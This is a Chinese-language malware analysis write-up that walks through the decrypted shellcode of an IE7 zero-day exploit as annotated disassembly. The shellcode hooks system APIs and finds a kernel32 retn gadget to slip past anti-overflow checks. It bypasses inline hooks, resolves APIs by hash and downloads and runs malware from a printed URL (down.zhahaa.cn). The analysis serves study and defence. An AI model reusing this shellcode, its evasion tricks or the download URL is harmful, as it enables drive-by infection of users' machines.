
# IE7 0DAY 漏洞所用 shellcode 的分析

> 原文：[`www.pediy.com/kssd/pediy10/78502.html`](https://www.pediy.com/kssd/pediy10/78502.html)

作者主页: http://hi.baidu.com/yicong2007  
目    的: 纯属学习，请勿用于恶意用途  
Platform: XP SP3

继上次[flash 漏洞所用 shellcode 的分析](http://bbs.pediy.com/showthread.php?t=65907)后，过了半年，IE7 0DAY 又来了。于是我同样看了这个漏洞所用的 shellcode。

与上次分析的 shellcode 相比，可以看出，由于这两个溢出提供给黑客可供写入 shellcode 的缓冲区都很大，shellcode 在这种情况下可以不考虑空间限制，而毫无顾忌地把自己做得功能又全又强大。

以下 IE7 0DAY 所用 shellcode，其主要行为不外乎下载病毒到本机并运行，但是实现起来与一般短小的 shellcode 有所不同：

1. 在进行实质性动作之前，shellcode 进行了三个 inline hook，hook 的 API 函数分别为：

`kernel32!UnhandledExceptionFilter`

`user32!MessageBeep`

`ntdll!LdrShutdownThread`

我没明白 hook 掉这三个 API 有何必要，而且是直接转到 shellcode 定义的替代函数，调用之后没有回到原始函数中。

`UnhandledExceptionFilter` 的替代函数 `retn` 时的堆栈似乎不平？

其他两个替代函数，则是通过调用 `EnumWindows` 来关闭 IE 的窗口并退出。

2. 实现下载使用 `URLDownloadToCacheFileA` 而不使用通常的 `URLDownloadToFileA`，运行病毒则使用 `CreateProcessA` 创建 `cmd.exe` 进程，由 `cmd.exe` 进程`/c` 参数运行病毒。

使用 `URLDownloadToCacheFileA` 可以理解为尝试避免对 `URLDownloadToFileA` 的监控。但是此后直接运行下载到临时文件夹的病毒程序（虽然用了 `cmd`），这个作法显然不隐蔽。

3. 在调用 `VirtualProtect`、`GetProcAddress`、`LoadLibraryA` 等敏感函数时，尝试绕过安全软件的防溢出检测，这个方法 flash 漏洞 shellcode 也用过，就是在 `kernel32.dll` 中找到一个 `retn` 命令作为跳板。

另外调用一些函数时，尝试绕过可能存在的 INLINE HOOK，但是只能绕过直接修改开头 5 字节为 `jmp` 或 `call` 这种方式的 INLINE HOOK。

4. 有不少冗余的代码似乎始终没被使用过。很可能这个 shellcode 是从一个“通用 shellcode 模块”中提取的，才会有这种情况出现。

这个 shellcode“模块化”的特点很明显，主函数子函数交织得密密麻麻，比 flash 漏洞所用 shellcode 还要罗嗦，某种角度上看它更像一个 win32 汇编写出来的程序模块，而不是通常追求简练的 shellcode。同样是长度非常长的 shellcode，它在简练程度上不如 flash 漏洞所用 shellcode。

下面是 shellcode 的内容和注释。

shellcode 前面的 xor 解密部分代码已经去掉，分析的直接是解密后的 shellcode 原样。

分析基本都以注释的形式出现。因为 shellcode“模块化”的特点，我把子函数加了标签，这样就可以很直接地看出 shellcode 的流程和功能。

标签中形如"`Get_GlobalAlloc`"的函数，功能是获得相应 API 函数的地址（在 `eax` 中返回）。

标签中形如"`Getkernel32`"的函数，功能是获得相应 DLL 模块的基址（在 `eax` 中返回）。

其他的函数标签名称也应该是比较容易理解的。

主函数执行流程与以前一样用(1)、(2)……标明顺序，以便于阅读。

********************************************************************************

; shellcode 开始

```
00407000 > E8 36 03 00 00 call <Get_GlobalAlloc> ; (1)得到 GlobalAlloc 地址并 call 之，申请全局内存
00407005 68 00 20 00 00 push 2000
0040700A 6A 00 push 0
0040700C FFD0 call eax ; GlobalAlloc
0040700E B9 00 10 00 00 mov ecx, 1000
00407013 8BF8 mov edi, eax
00407015 EB 05 jmp short 0040701C ; (2)跳到下面的 call，定位下面的代码
00407017 5E pop esi ; (4)esi=00407021
00407018 F3:A4 rep movs byte ptr es:[edi], byte ptr [esi] ; 将下面内容拷贝到全局内存。这样做是因为下面有做 INLINE HOOK，HOOK 的替代函数代码必须在 shellcode 退出后保持有效，故要放在全局内存中（shellcode 退出时这部分内存不 free）。
0040701A FFD0 call eax ; (5)call 进这部分内容执行。这里可以直接把 eax 改回 00407021，就可以在原代码中执行了
0040701C E8 F6 FF FF FF call 00407017 ; (3)F7
00407021 E8 3D 03 00 00 call <Get_UnhandledExceptionFilter> ; (6)得到 UnhandledExceptionFilter 地址，并对其做 InlineHook
00407026 8BF8 mov edi, eax
00407028 E8 38 00 00 00 call <ChangeMemoryCharacterToWrite>
0040702D E8 4D 01 00 00 call <InlineHook_UnhandledExceptionFilter>
00407032 E8 46 00 00 00 call <ChangeMemoryCharacterBack>
00407037 E8 DB 03 00 00 call <Get_MessageBeep> ; (7)对 MessageBeep 做 InlineHook
0040703C 8BF8 mov edi, eax
0040703E E8 22 00 00 00 call <ChangeMemoryCharacterToWrite>
00407043 E8 44 01 00 00 call <InlineHook_MessageBeep>
00407048 E8 30 00 00 00 call <ChangeMemoryCharacterBack>
0040704D E8 89 03 00 00 call <Get_LdrShutdownThread> ; (8)对 LdrShutdownThread 做 InlineHook
00407052 8BF8 mov edi, eax
00407054 E8 0C 00 00 00 call <ChangeMemoryCharacterToWrite>
00407059 E8 61 01 00 00 call <InlineHook_LdrShutdownThread>
0040705E E8 1A 00 00 00 call <ChangeMemoryCharacterBack>
00407063 EB 58 jmp short 004070BD ; (9)跳到真正执行下载运行病毒的代码
```

********************************************************************************

; 接下来是部分子函数代码：

### ChangeMemoryCharacterToWrite

; 通过调用 VirtualProtect 改目标内存属性为可写，以做 InlineHook。对 VirutalProtect 进行调用时考虑了绕过可能的 Inlinehook。

```
00407065 > 53 push ebx
00407066 8BDC mov ebx, esp
00407068 53 push ebx
00407069 6A 40 push 40
0040706B 68 00 10 00 00 push 1000
00407070 57 push edi
00407071 E8 B1 02 00 00 call <Get_VirtualProtect> ; 得到 VirtualProtect 地址
00407076 E8 E5 00 00 00 call <CallPassingInlineHook> ; 尝试跳过其中可能存在的 INLINE HOOK 而调用之
0040707B 58 pop eax
0040707C C3 retn
```

### ChangeMemoryCharacterBack

; 将内存属性改回。

```
0040707D > 53 push ebx
0040707E 8BDC mov ebx, esp
00407080 53 push ebx
00407081 6A 20 push 20
00407083 68 00 10 00 00 push 1000
00407088 57 push edi
00407089 E8 99 02 00 00 call <Get_VirtualProtect>
0040708E E8 CD 00 00 00 call <CallPassingInlineHook>
00407093 58 pop eax
00407094 C3 retn
```

### FindRetCodeInkernel32

; 为了躲过某些安全软件的数据溢出检测，从 kernel32.dll 的空间中找到一个 retn 命令，作为跳板使用。

```
00407095 > 57 push edi
00407096 E8 3C 04 00 00 call <Getkernel32> ; 读取 PEB 得到 kernel32 基址
0040709B 8BF8 mov edi, eax
0040709D 33C9 xor ecx, ecx
0040709F 49 dec ecx
004070A0 33C0 xor eax, eax
004070A2 B0 C3 mov al, 0C3
004070A4 FC cld
004070A5 F2:AE repne scas byte ptr es:[edi] ; 扫描到其中的"retn"命令
004070A7 8D47 FF lea eax, dword ptr [edi-1]
004070AA 5F pop edi
004070AB C3 retn
```

### DoInlineHook

对 `edi` 处的代码进行 InlineHook。

```
004070AC > 5B pop ebx ; ebx=替代函数地址
004070AD 3E:C607 B8 mov byte ptr [edi], 0B8 ; mov eax, ProxyFunc
004070B1 3E:895F 01 mov dword ptr [edi+1], ebx
004070B5 66:3E:C747 05 F>mov word ptr [edi+5], 0E0FF ; jmp eax
004070BC C3 retn
```

********************************************************************************

; 主函数代码后面部分，下载病毒

```
004070BD /E9 95 04 00 00 jmp <LastCode> ; (10)跳到下面一个 call 来定位数据区。
004070C2 |5B pop ebx ; ebx=病毒 URL 地址
004070C3 |81EC 14 01 00 00 sub esp, 114
004070C9 |8BD4 mov edx, esp
004070CB |3E:C702 63 6D 64 2>mov dword ptr [edx], 20646D63 ; 'cmd /c "'
004070D2 |3E:C742 04 2F 63>mov dword ptr [edx+4], 2220632F
004070DA |83C2 08 add edx, 8
004070DD |33C0 xor eax, eax
004070DF |50 push eax
004070E0 |50 push eax
004070E1 |68 04 01 00 00 push 104
```



``` 
004070E6   |52              push    edx                                        ; szFileName  

004070E7   |53              push    ebx                                        ; szURL="http://down.zhahaa.cn/down/new.exe"  

004070E8   |50              push    eax  

004070E9   |E8 C1030000     call    <Get_URLDownloadToCacheFileA>  

004070EE   |FFD0            call    eax                                        ; (11)调用 URLDownloadToCacheFileA 将病毒文件下载到临时文件夹  

004070F0   |8BFC            mov     edi, esp  

004070F2   |8BC7            mov     eax, edi  

004070F4   |83C0 08         add     eax, 8                                     ; eax=szFileName  

004070F7   |3E:8A18         mov     bl, byte ptr \[eax\]  

004070FA   |84DB            test    bl, bl  

004070FC   |74 03           je      short 00407101                             ; 找字符串末尾  

004070FE   |40              inc     eax  

004070FF  ^|EB F6           jmp     short 004070F7  

00407101   |3E:C600 22      mov     byte ptr \[eax\], 22                         ; 加上'"'  

00407105   |33D2            xor     edx, edx  

00407107   |3E:8850 01      mov     byte ptr \[eax+1\], dl                       ; 末尾填 0  

0040710B   |83EC 54         sub     esp, 54  

0040710E   |33C0            xor     eax, eax  

00407110   |33DB            xor     ebx, ebx  

00407112   |8BCC            mov     ecx, esp  

00407114   |83F8 54         cmp     eax, 54  

00407117   |7D 09           jge     short 00407122  

00407119   |3E:891C01       mov     dword ptr \[ecx+eax\], ebx                   ; 内存填 0  

0040711D   |83C0 04         add     eax, 4  

00407120  ^|EB F2           jmp     short 00407114  

00407122   |8BCC            mov     ecx, esp  

00407124   |8BD9            mov     ebx, ecx  

00407126   |83C3 10         add     ebx, 10  

00407129   |33C0            xor     eax, eax  

0040712B   |3E:C743 2C 0100>mov     dword ptr \[ebx+2C\], 1  

00407133   |51              push    ecx  

00407134   |53              push    ebx  

00407135   |50              push    eax  

00407136   |50              push    eax  

00407137   |50              push    eax  

00407138   |50              push    eax  

00407139   |50              push    eax  

0040713A   |50              push    eax  

0040713B   |57              push    edi                                        ; cmd /c "(病毒文件路径)"  

0040713C   |50              push    eax  

0040713D   |E8 39030000     call    <Get_CreateProcessA>  

00407142   |E8 19000000     call    <CallPassingInlineHook>                    ; (12)调用 CreateProcessA 运行临时文件夹中的病毒  

00407147   |64:A1 04000000  mov     eax, dword ptr fs:\[4\]                      ; StackBase，栈底值  

0040714D   |8DA0 60FFFFFF   lea     esp, dword ptr \[eax\-A0\]                    ; 堆栈值重置  

00407153   |E8 37030000     call    <Get_#101Inshdocvw>                        ; 得到 shdocvw.dll 中导出序号为 101 的函数地址  

00407158   |33DB            xor     ebx, ebx  

0040715A   |53              push    ebx  

0040715B   |53              push    ebx  

0040715C   |53              push    ebx  

0040715D   |53              push    ebx  

0040715E   |FFD0            call    eax                                        ; (13)call shdocvw.#101  

********************************************************************************  

; 接下来是另一部分子函数代码：  

CallPassingInlineHook:  

; eax 为函数地址，检测是否有 inline hook，有则尝试绕过。  

00407160 >  8038 E8         cmp     byte ptr \[eax\], 0E8                        ; call 命令的开头  

00407163    8038 E9         cmp     byte ptr \[eax\], 0E9                        ; jmp 命令的开头  

00407166    75 0F           jnz     short 00407177                             ; 没有被 InlineHook，直接进去  

00407168    8178 05 9090909>cmp     dword ptr \[eax+5\], 90909090                ; 已被 InlineHook，检查 5 字节后部分是否被 nop 了  

0040716F    74 06           je      short 00407177                             ; 是，没有办法恢复，只能直接调用  

00407171    55              push    ebp                                        ; 后面 5 字节完好，则直接实现前面 5 字节原代码  

00407172    8BEC            mov     ebp, esp  

00407174    8D40 05         lea     eax, dword ptr \[eax+5\]                     ; 跳到 5 字节之后执行  

00407177    FFE0            jmp     eax  

; 下面这段似乎没有被调用到。  

00407179    E8 2EFFFFFF     call    <DoInlineHook>  

0040717E    C3              retn  

InlineHook_UnhandledExceptionFilter:  

; 以 call 命令下方的这个命令作为替代函数，对 edi 指向的内存空间写入 INLINE HOOK 代码。  

0040717F >  E8 28FFFFFF     call    <DoInlineHook>  

fakeUnhandledExceptionFilter:  

; UnhandledExceptionFilter 的替代函数  

00407184 >  B8 11010480     mov     eax, 80040111  

00407189    C2 0C00         retn    0C  

InlineHook_MessageBeep:  

0040718C >  E8 1BFFFFFF     call    <DoInlineHook>  

fakeMessageBeep:  

; 调用 EnumWindows 遍历所有窗口，利用回调函数关闭 IE7 窗口。  

00407191 >  33C0            xor     eax, eax  

00407193    50              push    eax  

00407194    54              push    esp                                        ; 传给回调函数一个指针用于写入计数  

00407195    E8 54000000     call    <GetEnumProcAddress>  

0040719A    50              push    eax  

0040719B    E8 8B020000     call    <Get_EnumWindows>                          ; 调用 EnumWindows 遍历窗口  

004071A0    FFD0            call    eax  

004071A2    36:803C24 00    cmp     byte ptr \[esp\], 0                          ; 计数是否为 0  

004071A7    77 0A           ja      short 004071B3                             ; 不为 0 则 Sleep（结合回调内容，这里似乎是等待自身被结束）  

004071A9    E8 41020000     call    <Get_ExitProcess>  

004071AE    33FF            xor     edi, edi  

004071B0    57              push    edi  

004071B1    FFD0            call    eax                                        ; 计数为 0 则直接调用 ExitProcess 退出进程。  

004071B3    E8 FB010000     call    <Get_Sleep>  

004071B8    68 FF000000     push    0FF  

004071BD    FFD0            call    eax  

InlineHook_LdrShutdownThread:  

004071BF >  E8 E8FEFFFF     call    <DoInlineHook>  

fakeLdrShutdownThread:  

; 与 fakeMessageBeep 差不多……  

004071C4 >  53              push    ebx  

004071C5    57              push    edi  

004071C6    56              push    esi  

004071C7    33C0            xor     eax, eax  

004071C9    50              push    eax  

004071CA    54              push    esp  

004071CB    E8 1E000000     call    <GetEnumProcAddress>  

004071D0    50              push    eax  

004071D1    E8 55020000     call    <Get_EnumWindows>  

004071D6    FFD0            call    eax  

004071D8    36:803C24 00    cmp     byte ptr \[esp\], 0  

004071DD    77 0A           ja      short 004071E9  

004071DF    E8 0B020000     call    <Get_ExitProcess>  

004071E4    33FF            xor     edi, edi  

004071E6    57              push    edi  

004071E7    FFD0            call    eax  

004071E9    58              pop     eax  

004071EA    5E              pop     esi  

004071EB    5F              pop     edi  

004071EC    5B              pop     ebx  

004071ED    C3              retn  

GetEnumProcAddress:  

; 返回 EnumWindows 的回调函数的地址  

004071EE > /EB 02           jmp     short 004071F2  

004071F0   |58              pop     eax  

004071F1   |C3              retn  

004071F2   \\E8 F9FFFFFF     call    004071F0  

EnumWindowsProc:  

; 当窗口为 IE 窗口时关闭之，当所属线程非当前进程时计数加 1（这里我觉得是不是应该只关闭自身线程的窗口才合理呢？）。  

004071F7 >  56              push    esi  

004071F8    57              push    edi  

004071F9    83EC 08         sub     esp, 8  

004071FC    8BFC            mov     edi, esp  

004071FE    6A 08           push    8  

00407200    57              push    edi  

00407201    3E:FF77 14      push    dword ptr \[edi+14\]  

00407205    E8 5D020000     call    <Get_GetClassNameA>  

0040720A    FFD0            call    eax  

0040720C    8BFC            mov     edi, esp  

0040720E    68 616D6500     push    656D61  
```



### 00407213
```
00407213    68 49454672     push    72464549
00407218    8BF4            mov     esi, esp                           ; "IEFrame"
0040721A    B9 08000000     mov     ecx, 8
0040721F    F3:A6           repe    cmps byte ptr es:[edi], byte ptr [esi]
00407221    75 2F           jnz     short 00407252                             ; 判断窗口类名是否为 IE 的类名"IEFrame"，否则跳走不做操作
00407223    6A 00           push    0
00407225    3E:FF7424 20    push    dword ptr ds:[esp+20]
0040722A    E8 24020000     call    <Get_GetWindowThreadProcessId>
0040722F    FFD0            call    eax
00407231    8BF8            mov     edi, eax
00407233    E8 CB010000     call    <Get_GetCurrentThreadId>
00407238    FFD0            call    eax
0040723A    3BF8            cmp     edi, eax
0040723C    74 08           je      short 00407246                             ; 窗口所属线程与自身线程一致则跳
0040723E    36:8B4424 20    mov     eax, dword ptr [esp+20]
00407243    3E:FF00         inc     dword ptr [eax]
00407246    3E:FF7424 1C    push    dword ptr ds:[esp+1C]
0040724B    E8 EF010000     call    <Get_DestroyWindow>
00407250    FFD0            call    eax
00407252    83C4 10         add     esp, 10
00407255    5F              pop     edi
00407256    5E              pop     esi
00407257    B8 01000000     mov     eax, 1
0040725C    C3              retn
```

## `Geturlmon`

; 得到 urlmon.dll 的基址。调用 `LoadLibraryA` 时尝试绕过防溢出检测和 INLINE HOOK。

```
0040725D >  68 6F6E0000     push    6E6F
00407262    68 75726C6D     push    6D6C7275
00407267    EB 15           jmp     short 0040727E
00407269    8D4424 04       lea     eax, dword ptr [esp+4]
0040726D    50              push    eax
0040726E    E8 22FEFFFF     call    <FindRetCodeInkernel32>
00407273    50              push    eax
00407274    E8 4A020000     call    <Get_LoadLibraryA>
00407279  ^ E9 E2FEFFFF     jmp     <CallPassingInlineHook>
0040727E    E8 E6FFFFFF     call    00407269
00407283    83C4 08         add     esp, 8
00407286    C3              retn
```

## `Getntdll`

; 得到 ntdll.dll 的基址，与 `Geturlmon` 相类似……

```
00407287 >  6A 6C           push    6C
00407289    68 6E74646C     push    6C64746E
0040728E    EB 15           jmp     short 004072A5
00407290    8D4424 04       lea     eax, dword ptr [esp+4]
00407294    50              push    eax
00407295    E8 FBFDFFFF     call    <FindRetCodeInkernel32>
0040729A    50              push    eax
0040729B    E8 23020000     call    <Get_LoadLibraryA>
004072A0  ^ E9 BBFEFFFF     jmp     <CallPassingInlineHook>
004072A5    E8 E6FFFFFF     call    00407290
004072AA    83C4 08         add     esp, 8
004072AD    C3              retn
```

## `GetUser32`

```
004072AE >  68 33320000     push    3233
004072B3    68 75736572     push    72657375
004072B8    EB 15           jmp     short 004072CF
004072BA    8D4424 04       lea     eax, dword ptr [esp+4]
004072BE    50              push    eax
004072BF    E8 D1FDFFFF     call    <FindRetCodeInkernel32>
004072C4    50              push    eax
004072C5    E8 F9010000     call    <Get_LoadLibraryA>
004072CA  ^ E9 91FEFFFF     jmp     <CallPassingInlineHook>
004072CF    E8 E6FFFFFF     call    004072BA
004072D4    83C4 08         add     esp, 8
004072D7    C3              retn
```

## `Getshdocvw`

```
004072D8 >  68 63767700     push    777663
004072DD    68 7368646F     push    6F646873
004072E2    EB 15           jmp     short 004072F9
004072E4    8D4424 04       lea     eax, dword ptr [esp+4]
004072E8    50              push    eax
004072E9    E8 A7FDFFFF     call    <FindRetCodeInkernel32>
004072EE    50              push    eax
004072EF    E8 CF010000     call    <Get_LoadLibraryA>
004072F4  ^ E9 67FEFFFF     jmp     <CallPassingInlineHook>
004072F9    E8 E6FFFFFF     call    004072E4
004072FE    83C4 08         add     esp, 8
00407301    C3              retn
```

## `Getvgx`

; 这个函数似乎没有被调用到，"vgx"也是我直接从字符串中找出来，本身是否有 bug 存疑。

```
00407302 >  68 76677800     push    786776
00407307    EB 15           jmp     short 0040731E
00407309    8D4424 04       lea     eax, dword ptr [esp+4]
0040730D    50              push    eax
0040730E    E8 82FDFFFF     call    <FindRetCodeInkernel32>
00407313    50              push    eax
00407314    E8 AA010000     call    <Get_LoadLibraryA>
00407319  ^ E9 42FEFFFF     jmp     <CallPassingInlineHook>
0040731E    E8 E6FFFFFF     call    00407309
00407323    83C4 04         add     esp, 4
00407326    C3              retn
```

## `Get_VirtualProtect`

; 得到 VirtualProtect 地址，方法是得到 kernel32.dll 基址后再遍历输出表。

```
00407327 >  E8 AB010000     call    <Getkernel32>
0040732C    68 1BC64679     push    7946C61B
00407331    50              push    eax
00407332    E8 C6010000     call    <GetAPIFromExport>
00407337    83C4 08         add     esp, 8
0040733A    C3              retn
```

## `Get_GlobalAlloc`

```
0040733B >  E8 97010000     call    <Getkernel32>
00407340    68 EC97030C     push    0C0397EC
00407345    50              push    eax
00407346    E8 B2010000     call    <GetAPIFromExport>
0040734B    83C4 08         add     esp, 8
0040734E    C3              retn
```

## `Get_GetProcAddress`

```
0040734F >  E8 83010000     call    <Getkernel32>
00407354    68 AAFC0D7C     push    7C0DFCAA
00407359    50              push    eax
0040735A    E8 9E010000     call    <GetAPIFromExport>
0040735F    83C4 08         add     esp, 8
00407362    C3              retn
```

## `Get_UnhandledExceptionFilter`

```
00407363 >  E8 6F010000     call    <Getkernel32>
00407368    68 ED56EF36     push    36EF56ED
0040736D    50              push    eax
0040736E    E8 8A010000     call    <GetAPIFromExport>
00407373    83C4 08         add     esp, 8
00407376    C3              retn
```

## `Get_SetUnhandledExceptionFilter`

```
00407377 >  E8 5B010000     call    <Getkernel32>
0040737C    68 F08A045F     push    5F048AF0
00407381    50              push    eax
00407382    E8 76010000     call    <GetAPIFromExport>
00407387    83C4 08         add     esp, 8
0040738A    C3              retn
```

## `Get_RtlAddVectoredExceptionHandler`

```
0040738B >  E8 F7FEFFFF     call    <Getntdll>
00407390    68 7868DB1C     push    1CDB6878
00407395    50              push    eax
00407396    E8 62010000     call    <GetAPIFromExport>
0040739B    83C4 08         add     esp, 8
0040739E    C3              retn
```

## `Get_ExitThread`

```
0040739F >  E8 33010000     call    <Getkernel32>
004073A4    68 EFCEE060     push    60E0CEEF
004073A9    50              push    eax
004073AA    E8 4E010000     call    <GetAPIFromExport>
004073AF    83C4 08         add     esp, 8
004073B2    C3              retn
```

## `Get_Sleep`

```
004073B3 >  E8 1F010000     call    <Getkernel32>
004073B8    68 B0492DDB     push    DB2D49B0
004073BD    50              push    eax
004073BE    E8 3A010000     call    <GetAPIFromExport>
004073C3    83C4 08         add     esp, 8
004073C6    C3              retn
```

## `Get_Unknown`

; 这个函数没有被调用到。由于 `Getvgx` 调用失败，所以我不知道这里得到的是什么函数地址，只能 Unknown 了……

```
004073C7 >  E8 36FFFFFF     call    <Getvgx>
004073CC    68 AB5E9B1E     push    1E9B5EAB
004073D1    50              push    eax
004073D2    E8 26010000     call    <GetAPIFromExport>
004073D7    83C4 08         add     esp, 8
004073DA    C3              retn
```

## `Get_LdrShutdownThread`

```
004073DB >  E8 A7FEFFFF     call    <Getntdll>
004073E0    68 59978102     push    2819759
004073E5    50              push    eax
```



`004073E6`    `E8 12010000`     call    `<GetAPIFromExport>`  

`004073EB`    `83C4 08`         add     esp, 8  

`004073EE`    `C3`              retn  

### Get_ExitProcess:

```
004073EF >  E8 E3000000     call    <Getkernel32>                              
004073F4    68 7ED8E273     push    73E2D87E
004073F9    50              push    eax
004073FA    E8 FE000000     call    <GetAPIFromExport>
004073FF    83C4 08         add     esp, 8
00407402    C3              retn
```

### Get_GetCurrentThreadId:

```
00407403 >  E8 CF000000     call    <Getkernel32>                              
00407408    68 9EF9BB35     push    35BBF99E
0040740D    50              push    eax
0040740E    E8 EA000000     call    <GetAPIFromExport>
00407413    83C4 08         add     esp, 8
00407416    C3              retn
```

### Get_MessageBeep:

```
00407417 >  E8 92FEFFFF     call    <GetUser32>                                
0040741C    68 57A0B5BB     push    BBB5A057
00407421    50              push    eax
00407422    E8 D6000000     call    <GetAPIFromExport>
00407427    83C4 08         add     esp, 8
0040742A    C3              retn
```

### Get_EnumWindows:

```
0040742B >  E8 7EFEFFFF     call    <GetUser32>                                
00407430    68 1A7A1E02     push    21E7A1A
00407435    50              push    eax
00407436    E8 C2000000     call    <GetAPIFromExport>
0040743B    83C4 08         add     esp, 8
0040743E    C3              retn
```

### Get_DestroyWindow:

```
0040743F >  E8 6AFEFFFF     call    <GetUser32>                                
00407444    68 E05B3094     push    94305BE0
00407449    50              push    eax
0040744A    E8 AE000000     call    <GetAPIFromExport>
0040744F    83C4 08         add     esp, 8
00407452    C3              retn
```

### Get_GetWindowThreadProcessId:

```
00407453 >  E8 56FEFFFF     call    <GetUser32>                                
00407458    68 97C9E2A3     push    A3E2C997
0040745D    50              push    eax
0040745E    E8 9A000000     call    <GetAPIFromExport>
00407463    83C4 08         add     esp, 8
00407466    C3              retn
```

### Get_GetClassNameA:

```
00407467 >  E8 42FEFFFF     call    <GetUser32>                                
0040746C    68 6824C5B3     push    B3C52468
00407471    50              push    eax
00407472    E8 86000000     call    <GetAPIFromExport>
00407477    83C4 08         add     esp, 8
0040747A    C3              retn
```

### Get_CreateProcessA:

```
0040747B >  E8 57000000     call    <Getkernel32>                              
00407480    68 72FEB316     push    16B3FE72
00407485    50              push    eax
00407486    E8 72000000     call    <GetAPIFromExport>
0040748B    83C4 08         add     esp, 8
0040748E    C3              retn
```

### Get_#101Inshdocvw:

`; 得到 shdocvw.dll 中导出序号为 101 的函数地址。`

`; 由于这里是按序号查找的，所以这里唯一一次使用了 GetProcAddress，在调用 GetProcAddress 的时候尝试绕过防溢出检测和 INLINE HOOK。`

```
0040748F >  E8 44FEFFFF     call    <Getshdocvw>                               
00407494    EB 13           jmp     short 004074A9
00407496    6A 65           push    65
00407498    50              push    eax
00407499    E8 F7FBFFFF     call    <FindRetCodeInkernel32>
0040749E    50              push    eax
0040749F    E8 ABFEFFFF     call    <Get_GetProcAddress>
004074A4  ^ E9 B7FCFFFF     jmp     <CallPassingInlineHook>
004074A9    E8 E8FFFFFF     call    00407496
004074AE    C3              retn
```

### Get_URLDownloadToCacheFileA:

```
004074AF >  E8 A9FDFFFF     call    <Geturlmon>                                
004074B4    68 4FEF4F05     push    54FEF4F
004074B9    50              push    eax
004074BA    E8 3E000000     call    <GetAPIFromExport>
004074BF    83C4 08         add     esp, 8
004074C2    C3              retn
```

### Get_LoadLibraryA:

```
004074C3 >  E8 0F000000     call    <Getkernel32>                              
004074C8    68 8E4E0EEC     push    EC0E4E8E
004074CD    50              push    eax
004074CE    E8 2A000000     call    <GetAPIFromExport>
004074D3    83C4 08         add     esp, 8
004074D6    C3              retn
```

### Getkernel32:

`; 得到 kernel32.dll 的基址，这一块太 common 了。在 WIN9X 和 NT 以上采用不同的代码。`

```
004074D7 >  33C0            xor     eax, eax                                    
004074D9    64:8B40 30      mov     eax, dword ptr fs:[eax+30]
004074DD    85C0            test    eax, eax
004074DF    78 10           js      short 004074F1
004074E1    3E:8B40 0C      mov     eax, dword ptr [eax+C]
004074E5    3E:8B70 1C      mov     esi, dword ptr [eax+1C]
004074E9    AD              lods    dword ptr [esi]
004074EA    3E:8B40 08      mov     eax, dword ptr [eax+8]
004074EE    C3              retn
004074EF    EB 0B           jmp     short 004074FC
004074F1    3E:8B40 34      mov     eax, dword ptr [eax+34]
004074F5    83C0 7C         add     eax, 7C
004074F8    3E:8B40 3C      mov     eax, dword ptr [eax+3C]
004074FC    C3              retn
```

### GetAPIFromExport:

`; 根据 DLL 模块基址和函数名加密 HASH 值，遍历 DLL 的输出表找到 API 函数地址，这也是 common 的模块。`

```
004074FD >  60              pushad                                          
004074FE    36:8B6C24 24    mov     ebp, dword ptr [esp+24]
00407503    36:8B45 3C      mov     eax, dword ptr [ebp+3C]
00407507    36:8B5405 78    mov     edx, dword ptr [ebp+eax+78]
0040750C    03D5            add     edx, ebp
0040750E    3E:8B4A 18      mov     ecx, dword ptr [edx+18]
00407512    3E:8B5A 20      mov     ebx, dword ptr [edx+20]
00407516    03DD            add     ebx, ebp
00407518    E3 3B           jecxz   short 00407555
0040751A    49              dec     ecx
0040751B    3E:8B348B       mov     esi, dword ptr [ebx+ecx*4]
0040751F    03F5            add     esi, ebp
00407521    33FF            xor     edi, edi
00407523    33C0            xor     eax, eax
00407525    FC              cld
00407526    AC              lods    byte ptr [esi]
00407527    84C0            test    al, al
00407529    74 07           je      short 00407532
0040752B    C1CF 0D         ror     edi, 0D
0040752E    03F8            add     edi, eax
00407530  ^ EB F4           jmp     short 00407526
00407532    36:3B7C24 28    cmp     edi, dword ptr [esp+28]
00407537  ^ 75 DF           jnz     short 00407518
00407539    3E:8B5A 24      mov     ebx, dword ptr [edx+24]
0040753D    03DD            add     ebx, ebp
0040753F    66:3E:8B0C4B    mov     cx, word ptr [ebx+ecx*2]
00407544    3E:8B5A 1C      mov     ebx, dword ptr [edx+1C]
00407548    03DD            add     ebx, ebp
0040754A    3E:8B048B       mov     eax, dword ptr [ebx+ecx*4]
0040754E    03C5            add     eax, ebp
00407550    36:894424 1C    mov     dword ptr [esp+1C], eax
00407555    61              popad
00407556    C3              retn
```

### LastCode:

```
00407557    E8 66FBFFFF     call    004070C2
```

### DataArea:

```
0040755C    ASCII: "http://down.zhahaa.cn/down/new.exe"
```
